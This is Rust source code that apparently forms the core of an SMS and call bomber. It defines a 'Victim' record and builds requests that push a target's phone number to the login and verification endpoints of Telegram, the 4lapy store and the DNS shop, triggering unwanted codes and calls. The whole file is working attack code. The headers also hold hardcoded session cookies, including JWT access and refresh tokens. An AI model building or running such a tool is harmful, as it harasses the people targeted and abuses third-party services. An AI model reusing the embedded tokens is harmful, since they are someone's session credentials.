use crate::phone::{
    Country,
    FormatterTypes::{WithPlus, WithPlusBracketsHyphen, WithPlusHyphen},
    Phone,
};
use reqwest::header::HeaderMap;
use reqwest::Method;
use serde_json::json;

#[derive(Debug, Clone)]
pub struct Service {
    pub name: String,
    pub service_type: ServiceType,
    pub method: Method,
    pub url: String,
    pub headers: HeaderMap,
    pub body_type: BodyType,
    pub body: serde_json::Value,
}

#[derive(Debug, Clone)]
pub enum ServiceType {
    Sms,
    Call,
    ServiceSms,
}

#[derive(Debug, Clone)]
pub enum BodyType {
    JSON,
    Form,
}

#[derive(Debug, Clone)]
pub struct Victim {
    pub phone: Phone,
    pub email: String,
    pub name: String,
    pub surname: String,
}

/*
//
{
    let mut service = Service {
        name: "".to_string(),
        service_type: ServiceType::,
        method: Method::,
        url: "".to_string(),
        headers: HeaderMap::new(),
        body_type: BodyType::,
        body: Default::default(),
    };

    service.headers.insert("", r#""#.parse().unwrap());

    let mut phone = victim.phone.clone();
    phone.format(WithPlus);
    service.body = json!({
        "phone": phone.phone
    });

    services.push(service);
}
*/

pub fn construct_services_list(victim: Victim) -> Vec<Service> {
    let mut services = Vec::new();

    match victim.phone.country {
        Country::Ru => {
            // Telegram
            {
                let mut service = Service {
                    name: "Telegram".to_string(),
                    service_type: ServiceType::ServiceSms,
                    method: Method::POST,
                    url: "https://my.telegram.org/auth/send_password".to_string(),
                    headers: HeaderMap::new(),
                    body_type: BodyType::Form,
                    body: Default::default(),
                };

                let mut phone = victim.phone.clone();
                phone.format(WithPlus);
                service.body = json!({
                    "phone": phone.phone
                });

                services.push(service);
            }
            // 4lapy
            {
                let mut service = Service {
                    name: "4lapy".to_string(),
                    service_type: ServiceType::Sms,
                    method: Method::POST,
                    url: "https://4lapy.ru/api/auth/newCode/".to_string(),
                    headers: HeaderMap::new(),
                    body_type: BodyType::JSON,
                    body: Default::default(),
                };

                service.headers.insert("Cookie", r#"currentPage=%2Flandings%2Fdobrolap%2F; previousPage=%2F; 4lapy_site_v5=new; 4lapy_site_force=true; NEXT_CUSTOMER_TOKEN=%7B%22accessToken%22%3A%22eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJ6TzRUSGllX05QTW5uWkFQOXFLZC1FaElvbGNCY1dhSVFzUUdVLWJGVTc4In0.eyJleHAiOjE3MjMxMTc5NjEsImlhdCI6MTcyMzExNzY2MSwianRpIjoiZTdhY2UzNDAtNTNhMi00ODcyLWIyZDItMWQ0NzJlNmNkZjk5IiwiaXNzIjoiaHR0cHM6Ly9rZXljbG9hay5pbmZyYS9yZWFsbXMvY3VzdG9tZXIiLCJhdWQiOiJhY2NvdW50Iiwic3ViIjoiNWY0M2Q0ZmEtNDdhMi00ZGRlLWEwN2ItZTVhNWIyMGYyMTU1IiwidHlwIjoiQmVhcmVyIiwiYXpwIjoid2ViLWN1c3RvbWVyIiwic2Vzc2lvbl9zdGF0ZSI6IjU5ZjhhMDRjLWUzZmYtNDUzNS04ZDhiLTRlMDgwZWY1YTNjNyIsImFjciI6IjEiLCJyZWFsbV9hY2Nlc3MiOnsicm9sZXMiOlsib2ZmbGluZV9hY2Nlc3MiLCJ1bWFfYXV0aG9yaXphdGlvbiIsImRlZmF1bHQtcm9sZXMtY3VzdG9tZXIiXX0sInJlc291cmNlX2FjY2VzcyI6eyJhY2NvdW50Ijp7InJvbGVzIjpbIm1hbmFnZS1hY2NvdW50IiwibWFuYWdlLWFjY291bnQtbGlua3MiLCJ2aWV3LXByb2ZpbGUiXX19LCJzY29wZSI6InByb2ZpbGUgZW1haWwiLCJzaWQiOiI1OWY4YTA0Yy1lM2ZmLTQ1MzUtOGQ4Yi00ZTA4MGVmNWEzYzciLCJlbWFpbF92ZXJpZmllZCI6ZmFsc2UsImN1c3RvbWVySWQiOjkxNjcyNTM3LCJwcmVmZXJyZWRfdXNlcm5hbWUiOiJjYmZmNzFkNDFmZGI0OGQ1OThjZGM1ZWMxZGI1ZTUyOCJ9.Ournlzfj7p-IeI0zYR8AIx1JN8z7d_aJ-VIlzSYG7pkKRlah_94VFEP4TOkObBrd2PWi0lhuEAWB8WRcXfKpDh-nENd8rPUpN9qs0_kRq2Phb_Rv846sBFkuYHDXXk379cqFpA-Amo0ATXpNxyaY6ladj4LDCrs7R020zjGdbyvg8_XroTS8pOihZeW8LJMyrKSH0bPjQ5BTnMyidnU4bjVidTaWF4QL6Itv6gioCSUpdy2vXosqMkwn2_1VpRM-FgmeKWsbFgohHbA2Vx1tnvqmknNwJrf-kKPw_YIeRiyF7R3Wshxr26nnNz39FLDyHeKq6k0ihUDSF_MkpToQfQ%22%2C%22refreshToken%22%3A%22eyJhbGciOiJIUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJlNWQ5MTc0Yi0yZWJjLTQ4ZmItOGM0NC03ZTg0M2E2ZmYxNmEifQ.eyJleHAiOjE3MjU3MDk2NjEsImlhdCI6MTcyMzExNzY2MSwianRpIjoiZWUwYzE1MDktZjBkMi00Zjk3LThjNDItNDMyMGVmNTdkZjhmIiwiaXNzIjoiaHR0cHM6Ly9rZXljbG9hay5pbmZyYS9yZWFsbXMvY3VzdG9tZXIiLCJhdWQiOiJodHRwczovL2tleWNsb2FrLmluZnJhL3JlYWxtcy9jdXN0b21lciIsInN1YiI6IjVmNDNkNGZhLTQ3YTItNGRkZS1hMDdiLWU1YTViMjBmMjE1NSIsInR5cCI6IlJlZnJlc2giLCJhenAiOiJ3ZWItY3VzdG9tZXIiLCJzZXNzaW9uX3N0YXRlIjoiNTlmOGEwNGMtZTNmZi00NTM1LThkOGItNGUwODBlZjVhM2M3Iiwic2NvcGUiOiJwcm9maWxlIGVtYWlsIiwic2lkIjoiNTlmOGEwNGMtZTNmZi00NTM1LThkOGItNGUwODBlZjVhM2M3In0.L1Eao_rMK3uitZlkaAoBjATCR2P90RUlBWVxr-N56cw%22%2C%22tokenType%22%3A%22Bearer%22%2C%22expiresIn%22%3A300%2C%22sessionState%22%3A%2259f8a04c-e3ff-4535-8d8b-4e080ef5a3c7%22%2C%22scope%22%3A%22profile%20email%22%2C%22refreshExpiresIn%22%3A2592000%2C%22expiresAt%22%3A1723117961469%2C%22refreshExpiresAt%22%3A1725709661469%7D; g4c_x=1; _userGUID=0:lzl7rn6h:7sThR1GuZizvLXpg8tqkDPqYlire9LZT; dSesn=dd062781-f6e3-1bc6-a597-b1d859b692e7; _dvs=0:lzl7rn6h:aqZJzNtf1Q~QJQj23NMmPzXidgA~ctgK; location=%7B%22postalCode%22%3A%22101000%22%2C%22fiasId%22%3A%220c5b2444-70a0-4932-980c-b4dc0d3f02b5%22%2C%22kladrId%22%3A%227700000000000%22%2C%22rusRegionId%22%3A77%2C%22regionFiasId%22%3A%220c5b2444-70a0-4932-980c-b4dc0d3f02b5%22%2C%22regionName%22%3A%22%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%20%D0%B3%D0%BE%D1%80%D0%BE%D0%B4%22%2C%22areaName%22%3A%22%20%22%2C%22cityName%22%3A%22%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%22%2C%22settlementName%22%3A%22%22%2C%22streetName%22%3A%22%20%22%2C%22houseName%22%3A%22%20%22%2C%22flatName%22%3A%22%20%22%2C%22typeCode%22%3A%22region%22%2C%22typeName%22%3A%22%D0%B3%D0%BE%D1%80%D0%BE%D0%B4%22%2C%22value%22%3A%22%D0%B3%20%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%22%2C%22geo_lat%22%3A%2255.75396%22%2C%22geo_lon%22%3A%2237.620393%22%2C%22timezone%22%3A%22UTC%2B3%22%2C%22streetShort%22%3A%22%22%2C%22streetType%22%3A%22%22%2C%22houseShort%22%3A%22%22%2C%22houseType%22%3A%22%22%2C%22blockName%22%3A%22%22%2C%22blockType%22%3A%22%22%7D; polygon=r468-10-14-14-18-18-22; _ga_GRN90Z74D3=GS1.1.1723117669.1.1.1723117749.44.0.0; _ga=GA1.1.1699357532.1723117670; rrpvid=962500276817422; tmr_lvid=886243903520ca301abd3c3dd7f6c5fd; tmr_lvidTS=1723117672164; rcuid=66b4b06d5a442c690dc06be2; _ym_uid=1723117678991205878; _ym_d=1723117678; _ym_isad=2; domain_sid=HUoqZbDBqQL6J3ihwirC9%3A1723117681381; tmr_detect=0%7C1723117683099; cookieShown=true"#.parse().unwrap());

                let phone = victim.phone.clone();
                service.body = json!({
                    "phone": phone.phone
                });

                services.push(service);
            }
            // DNS
            {
                let mut service = Service {
                    name: "DNS".to_string(),
                    service_type: ServiceType::Call,
                    method: Method::POST,
                    url: "https://www.dns-shop.ru/auth/auth/fast-authorization/".to_string(),
                    headers: HeaderMap::new(),
                    body_type: BodyType::Form,
                    body: Default::default(),
                };

                service.headers.insert("Cookie", r#"qrator_jsr=1723134943.891.bZA1mPLKscU7myr3-no9pgdc87rb1cc41j5c435122d4m4aee-00; qrator_ssid=1723134945.200.tB6sCNRMTxnS9mZT-th5o0b3bc8jr2ql6dc0ccp978iphttq5; qrator_jsid=1723134943.891.bZA1mPLKscU7myr3-k4tmm4n3g0v9ekubja8t83bea7frprd7; lang=ru; city_path=moscow; current_path=605bfdc517d7e9e23947448a9bf1ce16ac36b884434a3fdb10db053793c50392a%3A2%3A%7Bi%3A0%3Bs%3A12%3A%22current_path%22%3Bi%3A1%3Bs%3A115%3A%22%7B%22city%22%3A%2230b7c1f3-03fb-11dc-95ee-00151716f9f5%22%2C%22cityName%22%3A%22%5Cu041c%5Cu043e%5Cu0441%5Cu043a%5Cu0432%5Cu0430%22%2C%22method%22%3A%22manual%22%7D%22%3B%7D; phonesIdentV2=0c63b8e9-77d0-449f-b0dd-ec99e69c9dc6; cartUserCookieIdent_v3=1a84a07b671c1aecbf929fa9faafcbcb91ce57f6d1ea2adb6dcdce4cdbec3befa%3A2%3A%7Bi%3A0%3Bs%3A22%3A%22cartUserCookieIdent_v3%22%3Bi%3A1%3Bs%3A36%3A%2265b0aa3b-e0f6-3c7e-beae-4715bf8b306c%22%3B%7D; _ab_=%7B%22catalog-filter-title-test%22%3A%22GROUP_2%22%7D; rrpvid=560296951004103; _ga_FLS4JETDHW=GS1.1.1723134957.1.1.1723134991.26.0.1400768249; _ga=GA1.1.298649215.1723134957; rcuid=66b4f3eeee55c15e759d7a55; tmr_lvid=fff40a89d5b30007c58d61cc405ab33b; tmr_lvidTS=1723134960450; _ym_uid=1723134961314038164; _ym_d=1723134961; _ym_isad=2; _ym_visorc=b; domain_sid=Dqj17u3-29WrUNyaTzlrr%3A1723134962861; tmr_detect=0%7C1723134968561; dnsauth_csrf=c02db7507fd5c3a7acba66f204a2934353e7910cdbeb6fa0dd3b4e94f0694389a%3A2%3A%7Bi%3A0%3Bs%3A12%3A%22dnsauth_csrf%22%3Bi%3A1%3Bs%3A36%3A%220085e58d-a105-4e76-b118-2a7bf227969a%22%3B%7D"#.parse().unwrap());

                let mut phone = victim.phone.clone();
                phone.format(WithPlus);
                service.body = json!({
                    "FastAuthorizationLoginLoadForm[login]": phone.phone,
                    "FastAuthorizationLoginLoadForm[token]" : "",
                    "FastAuthorizationLoginLoadForm[isPhoneCall]": 1
                });

                services.push(service);
            }
        }
    }

    services
}
